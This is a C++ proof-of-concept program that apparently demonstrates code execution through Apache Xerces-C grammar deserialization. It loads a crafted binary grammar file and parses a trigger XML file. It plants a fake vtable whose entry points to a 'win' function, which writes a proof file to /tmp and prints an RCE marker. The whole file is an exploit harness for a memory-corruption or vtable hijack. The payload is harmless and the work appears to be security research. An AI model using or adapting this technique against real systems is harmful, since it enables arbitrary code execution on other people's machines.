#include <xercesc/framework/MemBufInputSource.hpp>
#include <xercesc/framework/XMLGrammarPoolImpl.hpp>
#include <xercesc/parsers/XercesDOMParser.hpp>
#include <xercesc/sax/SAXParseException.hpp>
#include <xercesc/util/BinFileInputStream.hpp>
#include <xercesc/util/PlatformUtils.hpp>
#include <xercesc/util/XMLString.hpp>

#include <fcntl.h>
#include <unistd.h>

#include <cstring>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>

using namespace xercesc;

extern "C" void win() {
    constexpr char proof[] = "xerces-serialized-rce";
    int fd = ::creat("/tmp/xerces_serialized_rce_proof", 0600);
    if (fd != -1) {
        (void)::write(fd, proof, sizeof(proof) - 1);
        ::close(fd);
    }
    constexpr char msg[] = "[+] xerces rce\n";
    (void)::write(2, msg, sizeof(msg) - 1);
    _exit(42);
}

extern "C" {
void* fake_vtable[2] = {
    nullptr,
    (void*)win,
};
}

static std::string readFile(const char* path) {
    std::ifstream file(path, std::ios::binary);
    std::ostringstream data;
    data << file.rdbuf();
    return data.str();
}

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "usage: " << argv[0] << " <grammar.bin> [instance.xml]\n";
        return 1;
    }

    const char* grammarPath = argv[1];
    const char* instancePath = argc >= 3 ? argv[2] : "trigger.xml";

    XMLPlatformUtils::Initialize();
    {
        XMLGrammarPoolImpl pool;
        BinFileInputStream in(grammarPath);

        try {
            pool.deserializeGrammars(&in);
            std::cerr << "deserialized\n";

            XercesDOMParser parser(0, XMLPlatformUtils::fgMemoryManager, &pool);
            parser.setValidationScheme(XercesDOMParser::Val_Always);
            parser.setDoNamespaces(true);
            parser.setDoSchema(true);
            parser.useCachedGrammarInParse(true);
            parser.setValidationSchemaFullChecking(true);

            std::string xml = readFile(instancePath);
            MemBufInputSource src((const XMLByte*)xml.data(), xml.size(), instancePath, false);
            parser.parse(src);
            std::cerr << "parsed\n";
        } catch (const XMLException& e) {
            char* msg = XMLString::transcode(e.getMessage());
            std::cerr << "XMLException: " << msg << "\n";
            XMLString::release(&msg);
        } catch (const SAXParseException& e) {
            char* msg = XMLString::transcode(e.getMessage());
            std::cerr << "SAXParseException: " << msg << "\n";
            XMLString::release(&msg);
        } catch (...) {
            std::cerr << "exception\n";
        }
    }
    XMLPlatformUtils::Terminate();
    return 0;
}
